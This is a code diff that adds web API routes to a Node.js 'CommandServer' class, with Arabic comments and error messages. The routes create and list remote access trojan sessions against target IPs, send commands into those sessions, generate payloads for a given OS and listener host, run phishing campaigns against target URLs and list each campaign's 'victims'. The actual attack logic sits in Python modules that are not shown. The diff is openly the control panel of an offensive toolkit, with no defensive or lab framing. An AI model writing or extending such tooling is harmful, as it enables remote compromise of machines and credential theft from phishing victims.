@@ -1212,6 +1212,381 @@ class CommandServer {
         res.status(500).json({ success: false, error: 'خطأ في الحصول على الأدوات المتاحة' });
       }
     });
+
+    // واجهات API للوحدات الهجومية المتقدمة
+    this.app.post('/api/rat/create-session', async (req, res) => {
+      try {
+        const { target_ip, target_port, tool } = req.body;
+        
+        if (!target_ip) {
+          return res.status(400).json({ success: false, error: 'عنوان IP الهدف مطلوب' });
+        }
+
+        // تنفيذ إنشاء جلسة RAT عبر Python
+        const { spawn } = require('child_process');
+        const pythonProcess = spawn('python3', [
+          'advanced_rat_module.py',
+          '--create-session',
+          '--target-ip', target_ip,
+          '--target-port', target_port || '5555',
+          '--tool', tool || 'auto'
+        ]);
+
+        let output = '';
+        let error = '';
+
+        pythonProcess.stdout.on('data', (data) => {
+          output += data.toString();
+        });
+
+        pythonProcess.stderr.on('data', (data) => {
+          error += data.toString();
+        });
+
+        pythonProcess.on('close', (code) => {
+          if (code === 0) {
+            try {
+              const result = JSON.parse(output);
+              res.json(result);
+            } catch (parseError) {
+              res.status(500).json({ success: false, error: 'فشل في تحليل نتيجة إنشاء الجلسة' });
+            }
+          } else {
+            res.status(500).json({ 
+              success: false, 
+              error: 'فشل في إنشاء جلسة RAT',
+              details: error
+            });
+          }
+        });
+
+      } catch (error) {
+        console.error('خطأ في إنشاء جلسة RAT:', error);
+        res.status(500).json({ success: false, error: 'خطأ في إنشاء جلسة RAT' });
+      }
+    });
+
+    this.app.post('/api/rat/execute-command', async (req, res) => {
+      try {
+        const { session_id, command, parameters } = req.body;
+        
+        if (!session_id || !command) {
+          return res.status(400).json({ success: false, error: 'معرف الجلسة والأمر مطلوبان' });
+        }
+
+        // تنفيذ أمر RAT عبر Python
+        const { spawn } = require('child_process');
+        const pythonProcess = spawn('python3', [
+          'advanced_rat_module.py',
+          '--execute-command',
+          '--session-id', session_id,
+          '--command', command,
+          '--parameters', JSON.stringify(parameters || {})
+        ]);
+
+        let output = '';
+        let error = '';
+
+        pythonProcess.stdout.on('data', (data) => {
+          output += data.toString();
+        });
+
+        pythonProcess.stderr.on('data', (data) => {
+          error += data.toString();
+        });
+
+        pythonProcess.on('close', (code) => {
+          if (code === 0) {
+            try {
+              const result = JSON.parse(output);
+              res.json(result);
+            } catch (parseError) {
+              res.status(500).json({ success: false, error: 'فشل في تحليل نتيجة تنفيذ الأمر' });
+            }
+          } else {
+            res.status(500).json({ 
+              success: false, 
+              error: 'فشل في تنفيذ أمر RAT',
+              details: error
+            });
+          }
+        });
+
+      } catch (error) {
+        console.error('خطأ في تنفيذ أمر RAT:', error);
+        res.status(500).json({ success: false, error: 'خطأ في تنفيذ أمر RAT' });
+      }
+    });
+
+    this.app.get('/api/rat/sessions', async (req, res) => {
+      try {
+        const { spawn } = require('child_process');
+        const pythonProcess = spawn('python3', [
+          'advanced_rat_module.py',
+          '--get-sessions'
+        ]);
+
+        let output = '';
+        let error = '';
+
+        pythonProcess.stdout.on('data', (data) => {
+          output += data.toString();
+        });
+
+        pythonProcess.stderr.on('data', (data) => {
+          error += data.toString();
+        });
+
+        pythonProcess.on('close', (code) => {
+          if (code === 0) {
+            try {
+              const result = JSON.parse(output);
+              res.json(result);
+            } catch (parseError) {
+              res.status(500).json({ success: false, error: 'فشل في تحليل جلسات RAT' });
+            }
+          } else {
+            res.status(500).json({ success: false, error: 'فشل في الحصول على جلسات RAT' });
+          }
+        });
+
+      } catch (error) {
+        console.error('خطأ في الحصول على جلسات RAT:', error);
+        res.status(500).json({ success: false, error: 'خطأ في الحصول على جلسات RAT' });
+      }
+    });
+
+    this.app.post('/api/payload/generate', async (req, res) => {
+      try {
+        const payloadConfig = req.body;
+        
+        if (!payloadConfig.payload_type || !payloadConfig.target_os || !payloadConfig.lhost) {
+          return res.status(400).json({ 
+            success: false, 
+            error: 'نوع الـ payload ونظام التشغيل والـ LHOST مطلوبة' 
+          });
+        }
+
+        // توليد payload عبر Python
+        const { spawn } = require('child_process');
+        const pythonProcess = spawn('python3', [
+          'advanced_payload_module.py',
+          '--generate',
+          JSON.stringify(payloadConfig)
+        ]);
+
+        let output = '';
+        let error = '';
+
+        pythonProcess.stdout.on('data', (data) => {
+          output += data.toString();
+        });
+
+        pythonProcess.stderr.on('data', (data) => {
+          error += data.toString();
+        });
+
+        pythonProcess.on('close', (code) => {
+          if (code === 0) {
+            try {
+              const result = JSON.parse(output);
+              res.json(result);
+            } catch (parseError) {
+              res.status(500).json({ success: false, error: 'فشل في تحليل نتيجة توليد الـ payload' });
+            }
+          } else {
+            res.status(500).json({ 
+              success: false, 
+              error: 'فشل في توليد الـ payload',
+              details: error
+            });
+          }
+        });
+
+      } catch (error) {
+        console.error('خطأ في توليد الـ payload:', error);
+        res.status(500).json({ success: false, error: 'خطأ في توليد الـ payload' });
+      }
+    });
+
+    this.app.get('/api/payload/list', async (req, res) => {
+      try {
+        const { spawn } = require('child_process');
+        const pythonProcess = spawn('python3', [
+          'advanced_payload_module.py',
+          '--list'
+        ]);
+
+        let output = '';
+        let error = '';
+
+        pythonProcess.stdout.on('data', (data) => {
+          output += data.toString();
+        });
+
+        pythonProcess.stderr.on('data', (data) => {
+          error += data.toString();
+        });
+
+        pythonProcess.on('close', (code) => {
+          if (code === 0) {
+            try {
+              const result = JSON.parse(output);
+              res.json(result);
+            } catch (parseError) {
+              res.status(500).json({ success: false, error: 'فشل في تحليل قائمة الـ payloads' });
+            }
+          } else {
+            res.status(500).json({ success: false, error: 'فشل في الحصول على قائمة الـ payloads' });
+          }
+        });
+
+      } catch (error) {
+        console.error('خطأ في الحصول على قائمة الـ payloads:', error);
+        res.status(500).json({ success: false, error: 'خطأ في الحصول على قائمة الـ payloads' });
+      }
+    });
+
+    this.app.post('/api/phishing/create-campaign', async (req, res) => {
+      try {
+        const phishingConfig = req.body;
+        
+        if (!phishingConfig.target_url || !phishingConfig.phishing_type || !phishingConfig.lhost) {
+          return res.status(400).json({ 
+            success: false, 
+            error: 'رابط الهدف ونوع التصيد والـ LHOST مطلوبة' 
+          });
+        }
+
+        // إنشاء حملة تصيد عبر Python
+        const { spawn } = require('child_process');
+        const pythonProcess = spawn('python3', [
+          'advanced_phishing_module.py',
+          '--create-campaign',
+          JSON.stringify(phishingConfig)
+        ]);
+
+        let output = '';
+        let error = '';
+
+        pythonProcess.stdout.on('data', (data) => {
+          output += data.toString();
+        });
+
+        pythonProcess.stderr.on('data', (data) => {
+          error += data.toString();
+        });
+
+        pythonProcess.on('close', (code) => {
+          if (code === 0) {
+            try {
+              const result = JSON.parse(output);
+              res.json(result);
+            } catch (parseError) {
+              res.status(500).json({ success: false, error: 'فشل في تحليل نتيجة إنشاء الحملة' });
+            }
+          } else {
+            res.status(500).json({ 
+              success: false, 
+              error: 'فشل في إنشاء حملة التصيد',
+              details: error
+            });
+          }
+        });
+
+      } catch (error) {
+        console.error('خطأ في إنشاء حملة التصيد:', error);
+        res.status(500).json({ success: false, error: 'خطأ في إنشاء حملة التصيد' });
+      }
+    });
+
+    this.app.get('/api/phishing/campaigns', async (req, res) => {
+      try {
+        const { spawn } = require('child_process');
+        const pythonProcess = spawn('python3', [
+          'advanced_phishing_module.py',
+          '--get-campaigns'
+        ]);
+
+        let output = '';
+        let error = '';
+
+        pythonProcess.stdout.on('data', (data) => {
+          output += data.toString();
+        });
+
+        pythonProcess.stderr.on('data', (data) => {
+          error += data.toString();
+        });
+
+        pythonProcess.on('close', (code) => {
+          if (code === 0) {
+            try {
+              const result = JSON.parse(output);
+              res.json(result);
+            } catch (parseError) {
+              res.status(500).json({ success: false, error: 'فشل في تحليل حملات التصيد' });
+            }
+          } else {
+            res.status(500).json({ success: false, error: 'فشل في الحصول على حملات التصيد' });
+          }
+        });
+
+      } catch (error) {
+        console.error('خطأ في الحصول على حملات التصيد:', error);
+        res.status(500).json({ success: false, error: 'خطأ في الحصول على حملات التصيد' });
+      }
+    });
+
+    this.app.get('/api/phishing/victims/:campaign_id', async (req, res) => {
+      try {
+        const { campaign_id } = req.params;
+        
+        if (!campaign_id) {
+          return res.status(400).json({ success: false, error: 'معرف الحملة مطلوب' });
+        }
+
+        // الحصول على الضحايا عبر Python
+        const { spawn } = require('child_process');
+        const pythonProcess = spawn('python3', [
+          'advanced_phishing_module.py',
+          '--get-victims',
+          '--campaign-id', campaign_id
+        ]);
+
+        let output = '';
+        let error = '';
+
+        pythonProcess.stdout.on('data', (data) => {
+          output += data.toString();
+        });
+
+        pythonProcess.stderr.on('data', (data) => {
+          error += data.toString();
+        });
+
+        pythonProcess.on('close', (code) => {
+          if (code === 0) {
+            try {
+              const result = JSON.parse(output);
+              res.json(result);
+            } catch (parseError) {
+              res.status(500).json({ success: false, error: 'فشل في تحليل بيانات الضحايا' });
+            }
+          } else {
+            res.status(500).json({ 
+              success: false, 
+              error: 'فشل في الحصول على بيانات الضحايا',
+              details: error
+            });
+          }
+        });
+
+      } catch (error) {
+        console.error('خطأ في الحصول على بيانات الضحايا:', error);
+        res.status(500).json({ success: false, error: 'خطأ في الحصول على بيانات الضحايا' });
+      }
+    });
   }
 
   setupWebSocket() {
